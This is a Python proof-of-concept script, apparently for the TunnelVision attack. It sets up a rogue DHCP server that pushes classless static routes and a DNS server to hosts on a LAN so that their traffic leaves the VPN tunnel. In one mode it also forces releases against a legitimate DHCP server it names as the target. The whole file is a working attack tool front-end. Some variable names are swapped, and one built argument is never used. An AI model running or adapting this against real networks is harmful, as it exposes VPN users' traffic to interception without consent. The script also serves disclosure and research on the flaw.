#!/usr/bin/env python3
from arcane.network.interface import NetworkInterface
from arcane.dhcp.server import DHCPServer
from arcane.dhcp.subleaser import DHCPSubleaser
from arcane.dhcp.releaser import DHCPReleaser
from arcane.dhcp.range_leaser import DHCPRangeLeaser
from arcane.runtime import RUNTIME
from arcane.events import DHCPServerEvent, ARPTableEvent, DHCPReleaseEvent
from ipaddress import IPv4Address
from enum import Enum
import logging
import argparse

ALLOWED_EVENTS = [DHCPServerEvent.LEASE_ACCEPTED, DHCPServerEvent.LEASE_OFFERED, ARPTableEvent.ENTRY_CHANGED, DHCPReleaseEvent.LEASE_RELEASED]


class ConfigurationType(Enum):
    AUTHORITATIVE = "authoritative"
    ADJACENT      = "adjacent"


def build_parsers():
    parser     = argparse.ArgumentParser(prog='TunnelVision PoC', description='Decloaks VPN users on the LAN')
    subparsers = parser.add_subparsers(dest='type')
    parser.add_argument('-i', '--interface', help="Interface to listen on", required=True)
    parser.add_argument('-d', '--dns', help='DNS server')
    parser.add_argument('-r', '--route', action='append', help="Route to add to table. May be listed more than once")
    parser.add_argument('-l', '--lease-time', default=10, type=int, help='Lease duration')
    parser.add_argument('-v', '--verbose', action="store_true", help="Print DEBUG messages to console")

    authoritative_parser = subparsers.add_parser(ConfigurationType.ADJACENT.value)
    authoritative_parser.add_argument('-s', '--server', help="DHCP server to attack")

    adjacent_parser = subparsers.add_parser(ConfigurationType.AUTHORITATIVE.value)
    adjacent_parser.add_argument('-n', '--network', help='Network addresses to lease')
    adjacent_parser.add_argument('-m', '--mask', default='255.255.255.0', help='Subnet mask')

    return parser, subparsers, authoritative_parser, adjacent_parser


def allowlist_events():
    for event in ALLOWED_EVENTS:
        RUNTIME.event_manager.log_filter.allowlist_events.add(event)


def build_dhcp_base(parser):
    args = parser.parse_args()
    logging.root.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    interface = NetworkInterface(args.interface)

    options = {"lease_time": args.lease_time}
    kwargs  = {}

    if args.route:
        options["classless_static_routes"] = args.route

    if args.type == ConfigurationType.ADJACENT.value:
        lease_gen = DHCPSubleaser(interface)
        releaser  = DHCPReleaser(interface, lease_gen, args.server, sweep_time=5)
        kwargs['releaser'] = releaser
    else:
        start, end = args.network.split('-')
        lease_gen  = DHCPRangeLeaser(interface, IPv4Address(start), IPv4Address(end))
        options['subnet_mask'] = args.mask

    if args.dns:
        options['name_server'] = args.dns

    server = DHCPServer(interface, lease_gen, **options)
    
    return interface, server, lease_gen, kwargs


def main():
    allowlist_events()
    interface, _server, _lease_gen, _kwargs = build_dhcp_base(build_parsers()[0])
    interface.thread.join()



if __name__ == "__main__":
    main()
